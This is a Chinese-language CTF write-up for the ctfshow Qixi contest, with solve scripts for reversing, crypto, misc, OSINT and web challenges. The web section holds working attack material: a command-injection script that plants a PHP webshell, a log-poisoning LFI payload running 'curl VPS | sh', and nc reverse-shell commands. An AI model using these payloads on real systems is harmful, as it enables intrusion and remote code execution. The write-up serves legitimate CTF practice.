# ctfshow 七夕杯 wp
**5th(3-6并列) 2010 pts**

- [ctfshow 七夕杯 wp](#ctfshow-七夕杯-wp)
- [Re](#re)
  - [逆向签到](#逆向签到)
  - [easy_magic](#easy_magic)
- [CRYPTO](#crypto)
  - [密码签到](#密码签到)
  - [77×SES](#77ses)
- [MISC](#misc)
  - [杂项签到](#杂项签到)
  - [海盗的密码（怎么就一血了）](#海盗的密码怎么就一血了)
  - [真·签到·不太一样的拼图](#真签到不太一样的拼图)
- [OSINT](#osint)
  - [社工签到](#社工签到)
  - [迷失的大象](#迷失的大象)
  - [大飞机](#大飞机)
  - [铁道人之泪（下架）](#铁道人之泪下架)
- [Web](#web)
  - [web签到](#web签到)
  - [easy_calc](#easy_calc)
  - [easy_cmd（赛后复现）](#easy_cmd赛后复现)
- [WARMUP](#warmup)
  - [热身题目](#热身题目)

# Re
## 逆向签到
检查的字符被放到了栈上，手动拼回去就行

## easy_magic
后边的函数看了看确认是md5（魔数和64的分组），那显然比较的字段大概率不可逆（然而确实去搜了，没搜到）  
逻辑就是初始化一个char然后后边的值都和第一个char相关，但是在进一步运算前被xor了0x77，把0-255全跑了一遍发现没check成功，可能是什么神奇的控制字符没喂进去

于是直接把0x77 patch成0，再跑一遍直接就出了
```python
import struct

from pwn import *
context.log_level="debug"
for i in range(256):
     p=process("./re2.bin")
     p.sendlineafter(b"d",struct.pack("B",i))
     try:
        p.recvuntil(b"wrong")
     except:
        print(chr(i))
        exit()
     p.close()
```
这时正确的第一个字符是c，于是
```python
v7 = [0 for i in range(25)]
v7[0] = 17;
v7[1] = -14;
v7[2] = 13;
v7[3] = -11;
v7[4] = 7;
v7[5] = 8;
v7[6] = 4;
v7[7] = -68;
v7[8] = 65;
v7[9] = -25;
v7[10] = 7;
v7[11] = 6;
v7[12] = -11;
v7[13] = 6;
v7[14] = -8;
v7[15] = 10;
v7[16] = 10;
v7[17] = -20;
v7[18] = 9;
v7[19] = -3;
v7[20] = 13;
v7[21] = -13;
v7[22] = 24;
v5=ord('c')
for i in range(22):
    print(chr(v5),end="")
    v5 += v7[i]
```
# CRYPTO
## 密码签到
放到赛博厨子试了一下base64准备进一步操作，结果居然出了大半段flag，直接根据MISC签到和Re签到的格式猜出flag

## 77×SES
密码学菜鸡并不知道这是什么加密，但除去&0xFC一个迷惑假象之外就是标准的ARX，学到的新知识就是有限域上的模加和模乘看起来是可逆的（双射）

除了把交换和xor倒着走一遍就是整逆S盒，逆模加（两种情况），以及注意到   
(x & 0xfc + i) % 4 = (x & 0xfc) % 4 + i % 4 = 0 + i % 4
```python
from Crypto.Util.Padding import pad

deS = [183, 234, 6, 115, 108, 125, 93, 77, 91, 220, 245, 99, 177, 96, 219, 194, 29, 0, 162, 48, 246, 111, 46, 33, 106,
       13, 193, 41, 44, 35, 54, 50, 152, 25, 199, 100, 47, 212, 23, 138, 250, 68, 86, 114, 31, 169, 204, 73, 85, 94, 32,
       157, 18, 228, 11, 43, 127, 166, 242, 251, 40, 55, 235, 42, 5, 238, 255, 131, 140, 167, 198, 248, 39, 182, 217,
       24, 61, 158, 253, 92, 159, 151, 8, 155, 170, 14, 128, 37, 186, 80, 63, 56, 176, 117, 83, 136, 26, 224, 15, 163,
       112, 148, 225, 30, 231, 135, 205, 79, 57, 187, 237, 70, 223, 78, 95, 22, 211, 104, 2, 113, 10, 1, 197, 165, 139,
       243, 36, 153, 101, 53, 147, 60, 203, 241, 126, 34, 189, 195, 82, 3, 232, 141, 110, 71, 69, 51, 218, 45, 132, 207,
       191, 121, 229, 144, 17, 164, 216, 221, 28, 97, 87, 116, 180, 81, 20, 208, 240, 175, 105, 168, 16, 74, 88, 98,
       184, 150, 124, 119, 179, 52, 118, 9, 134, 213, 4, 58, 236, 19, 146, 89, 75, 215, 226, 181, 145, 154, 254, 161,
       200, 137, 143, 206, 66, 133, 252, 249, 188, 227, 64, 38, 27, 196, 90, 62, 173, 84, 233, 202, 103, 149, 171, 209,
       192, 172, 210, 49, 107, 122, 72, 247, 102, 65, 123, 178, 185, 109, 7, 67, 160, 129, 120, 239, 59, 142, 156, 230,
       222, 12, 190, 201, 130, 214, 21, 174, 76, 244]


def dexor(block):
    for i in range(3, -1, -1):
        for j in range(3, -1, -1):
            block[i][j] ^= block[(i + 2) % 4][(j + 1) % 4]


dec_mul2 = [[-1 for _ in range(256)] for _ in range(256)]
dec_mul2_same = [-1 for _ in range(256)]
for x in range(256):
    for y in range(256):
        dec_mul2[(x + 2 * y) & 0xff][y] = x

for x in range(256):
    dec_mul2_same[(x + 2 * x) & 0xff] = x


# 特殊处理映射为自身的情况
def deadd(block):
    for i in range(3, -1, -1):
        for j in range(3, -1, -1):
            if ((i * 3) % 4 != i) or ((i + j) % 4 != j):
                block[i][j] = dec_mul2[block[i][j]][block[(i * 3) % 4][(i + j) % 4]]
            else:
                block[i][j] = dec_mul2_same[block[i][j]]


def desub(block):
    for i in range(4):
        for j in range(4):
            block[i][j] = deS[block[i][j]]


def derotate(row):
    row[3], row[1], row[2], row[0] = row[0], row[1], row[2], row[3]


def detranspose(block):
    copyBlock = [[block[i][j] for j in range(4)] for i in range(4)]
    for i in range(4):
        for j in range(4):
            block[i][j] = copyBlock[j][i]


def deswap(block):
    s = 0
    for i in range(4):
        for j in range(4):
            s += block[i][j]
    if s % 2:
        detranspose(block)

    # &0xfc就是玩人的，&后mod4永远是0，翻着换一次就行
    # >>> bin(0xfc) '0b11111100'
    for i in range(3):
        for j in range(3, -1, -1):
            jj = (j + 3) % 4
            block[i][j], block[i][jj] = block[i][jj], block[i][j]

    derotate(block[3])
    derotate(block[3])
    derotate(block[3])
    derotate(block[2])
    derotate(block[1])
    derotate(block[1])
    derotate(block[1])
    derotate(block[0])
    derotate(block[0])
    block[2], block[0] = block[0], block[2]
    block[2], block[1] = block[1], block[2]
    block[3], block[0] = block[3], block[0]
    block[0], block[1] = block[1], block[0]
    block[3], block[2] = block[2], block[3]
    block[0], block[2] = block[2], block[0]


def deround(block):
    dexor(block)
    deswap(block)
    deadd(block)
    desub(block)


def decryptBlock(block):
    mat = [[block[i * 4 + j] for j in range(4)] for i in range(4)]
    for _ in range(77):
        deround(mat)
    return [mat[i][j] for i in range(4) for j in range(4)]


if name == 'main':
    msg = bytes.fromhex(
        "f000ae7e94f48ef99da6390f99a08701cf16d63596bebac938ec36004d54b73d1712c2f38926c3bcc5e5f42c4d55b57ef1070a7b443677b3cc4372d9a41a4775")
    for ix in range(0, len(msg), 16):
        print(bytes(decryptBlock(msg[ix: ix + 16])), end="")
```

# MISC
## 杂项签到
文件末尾明文

## 海盗的密码（怎么就一血了）
搜索马里IP段第一条复制下来生成字典
```python
d='''41.78.72.0  41.78.75.255  1024
41.79.196.0  41.79.199.255  1024
41.223.108.0  41.223.111.255  1024
102.38.48.0  102.38.51.255  1024
102.68.16.0  102.68.19.255  1024
102.68.144.0  102.68.151.255  2048
102.128.128.0  102.128.135.255  2048
102.141.196.0  102.141.199.255  1024
102.218.10.0  102.218.11.255  512
102.218.56.0  102.218.59.255  1024
102.218.98.0  102.218.98.255  256
102.220.40.0  102.220.43.255  1024
102.223.188.0  102.223.191.255  1024
154.72.24.0  154.72.27.255  1024
154.72.48.0  154.72.51.255  1024
154.73.24.0  154.73.27.255  1024
154.73.44.0  154.73.47.255  1024
154.73.124.0  154.73.127.255  1024
154.115.192.0  154.115.255.255  16384
154.118.240.0  154.118.243.255  1024
192.145.168.0  192.145.175.255  2048
196.11.62.0  196.11.62.255  256
196.49.58.0  196.49.58.255  256
196.60.54.0  196.60.54.255  256
197.157.244.0  197.157.247.255  1024
197.220.64.0  197.220.95.255  8192
197.231.200.0  197.231.203.255  1024'''
f=open("pw.txt","w")
for i in d.split("\n"):
    s,e,c=i.split("\t")
    A,B,C,D = str(s).split(".")
    for ip in range(int(c)):
        f.write(f"{A}.{B}.{str(int(C)+(ip//255))}.{str(ip%255)}\n")

f.close()
```
然后john瞬间就能跑出密码

`zip2john zip名字.zip > 1.txt`

`john 1.txt --wordlist=./pw.txt`

## 真·签到·不太一样的拼图
看了一下，60个字符，pr逐帧+media player快进半小时搞定，鉴定为嗯做

（其实是对代码能力没自信）

手搓的时间
```
f 2 8
9 1 26
6 1 18
8 1 54
4 1 32
6 1 51
c 1 22
a 1 46
_ 1 57
d 1 19
h 1 13
} 2 11
4 1 56
s 1 12
e 1 27
b 1 52
1 1 25
c 1 8
t 1 9
f 1 10
9 1 37
e 2 4
o 2 2
6 1 43
{ 1 16
a 1 44
l 2 5
f 1 48
1 1 35
6 1 28
0 1 20
d 1 49
4 1 21
8 1 30
2 1 34
b 1 58
f 1 29
x 2 10
a 1 31
a 1 17
7 1 50
e 1 53
b 1 38
0 1 47
o 1 14
o 2 9
y 2 6
v 2 3
5 1 42
c 1 41
7 1 33
1 1 24
_ 2 7
5 1 45
e 1 55
y 1 59
w 1 15
_ 2 0
f 1 36
3 1 40
l 2 1
b 1 23
c 1 39
```
排序
```python
d = open("500.txt").read()

r = ['*' for _ in range(500)]
for i in d.split("\n"):
    c, m, s = i.split(" ")
    assert r[int(m) * 60 + int(s)] == '*'
    r[int(m) * 60 + int(s)] = c

for i in r:
    if i != '*':
        print(i, end="")
```

# OSINT

注：以下搜索使用《百度》《谷歌》《yandex》三款引擎完成，原文链接无特殊注明均在前搜到的100张图内或者前3页可找到。

## 社工签到
识图就有了

## 迷失的大象
识图，没找到，直接搜文本“17 15头大象迷路 喝醉”倒是找到了

https://k.sina.com.cn/article_5638975650_1501bf0a2001016txn.html

## 大飞机
可以辨认出logo是国航的，搜到国航747只有8台，本来准备照着747搜，后来进一步识图找到原图

https://tieba.baidu.com/p/4924151210?red_tag=0130658886l

提到“大国航的748”，然后百度国航747-8航班号应该就出来了

## 铁道人之泪（下架）
直接搜可以找到两个出处知道了铁道名和可能在的位置  
然后把铁道名放到搜索引擎里再找，桥总共28个，但是有著名的桥并不多  
https://www.sohu.com/a/527685589_121294666  
盒了半天。车号都找到了，于是把搜到的两个桥的名字都交了一遍  

# Web
## web签到
直接抄常用姿势笔记，或者搜x字符RCE，这里是6字符好像，但可以直接用四字符的
```python
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-05-06 13:25:41
# @Last Modified by:   h1xa
# @Last Modified time: 2022-05-10 20:56:17
# @email: h1xa@ctfer.com
# @link: https://ctfer.com


import requests
import time

url = "http://xxxxxxxxxxxchallenge.ctf.show/api/"

payload = [
    '>\\ \\',
    '>-t\\',
    '>\\>a',
    '>ls\\',
    'ls>v',
    '>mv',
    '>vt',
    '*v*',
    '>ls',
    'l*>t',
    '>cat',
    '*t>z',

    '>php',
    '>a.\\',
    '>\\>\\',
    '>-d\\',
    '>\\ \\',
    '>64\\',
    '>se\\',
    '>ba\\',
    '>\\|\\',
    '>4=\\',
    '>Pz\\',
    '>k7\\',
    '>XS\\',
    '>sx\\',
    '>VF\\',
    '>dF\\',
    '>X0\\',
    '>gk\\',
    '>bC\\',
    '>Zh\\',
    '>ZX\\',
    '>Ag\\',
    '>aH\\',
    '>9w\\',
    '>PD\\',
    '>S}\\',
    '>IF\\',
    '>{\\',
    '>\\$\\',
    '>ho\\',
    '>ec\\',

    'sh z',
    'sh a'
]


def writeFile(payload):
    data = {
        "cmd": payload
    }
    requests.post(url+"tools.php", data=data)


def run():
    for p in payload:
        writeFile(p.strip())
        print("[*] create " + p.strip())
        time.sleep(1)


def check():
    response = requests.get(url + "a.php")
    if response.status_code == requests.codes.ok:
        print("[*] Attack success!!!Webshell is " + url + "a.php")


def main():
    run()
    check()


if __name__ == '__main__':
    main()

```

## easy_calc
试了一百万字符的回溯限制，但没成功

没过滤分号，翻了半天大佬博客发现可以include""

然后就是nginx通过日志包含LFI转RCE，如果是apache可能就不行了

```
POST
http://f1e29844-4aaa-4979-96fe-790bd199c489.challenge.ctf.show/calc.php?1=system("curl VPS地址 | sh");


num1=2&symbol=*&num2=3;include"/var/log/nginx/access.log";
```
同时设置一次User-Agent=`<?php eval($_GET['1']); ?>`

## easy_cmd（赛后复现）
赛后听群主大大讲解，原来是-e需要放后边兼容版本，之前-e放前面没成功还以为是nc是安全的版本，大失败

这里也记一下笔记，“nc允许-e的版本中有的-e在前有的在后，但在后一般兼容在前”

姿势A：nc 192.168.x.x 1234 -e /bin/sh  
姿势B：nc -e /bin/sh 192.168.x.x 1234  

# WARMUP
## 热身题目
提前放出签到以推测参赛人数预购负载，太妙了（